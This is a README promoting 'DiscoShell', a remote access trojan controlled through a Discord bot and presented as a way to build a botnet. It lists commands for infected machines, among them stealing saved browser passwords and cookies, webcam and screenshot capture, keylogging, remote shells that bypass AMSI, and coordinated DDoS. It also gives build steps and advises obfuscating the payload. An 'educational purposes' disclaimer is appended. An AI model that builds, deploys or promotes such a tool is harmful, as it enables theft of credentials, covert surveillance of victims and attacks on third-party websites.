# DiscoShell

DiscoShell is a minimal remote access trojan that is controlled via a Discord bot, allowing the creation of a Discord-based botnet.

![image](https://media.discordapp.net/attachments/961905736139554876/971733014654644254/unknown.png)

Join the Discord server for discussion and enquiries: https://discord.gg/Qzyq3Dqn82.

## Command list
The following commands are used to control infected machines.
```
get : Get username, machine name, IP address and IP location.
getsc : Get screenshot.
getcam : Get snapshot from all video sources.
getfile {file_path} : Upload file located in {file_path} to Discord.
setfile {file_path} : Download attached file to {file_path}.
getav : Get all antivirus products installed.
getlogins : Get saved Chromium-based browser passwords.
getcookies : Get saved Chromium-based browser cookies.

shell : Start remote command prompt session.
powershell : Start remote PowerShell session (automatically bypasses AMSI).
execute {command} : Execute command.

startkeylogger : Start keylogger.
stopkeylogger : Stop keylogger.
getkeylog : Get logged keys.

startddos {website_url} : Make all infected machines send GET requests to specified URL.
stopddos : Make all infected machines stop sending GET requests.

uninfect : Uninfect.
```

## How to build
1. Specify the token and other variables in the dropper project Program.cs.
2. Build the dropper project as x64.

Optional: Build the payload project and merge/embed all the dlls + obfuscate the output assembly. Replace payload.exe in the dropper project with your new payload.

## Disclaimer
This project was made for educational purposes and to test the capabilities of using Discord as a C2 server. If you choose to use this illegally/maliciously, it is your responsibility.
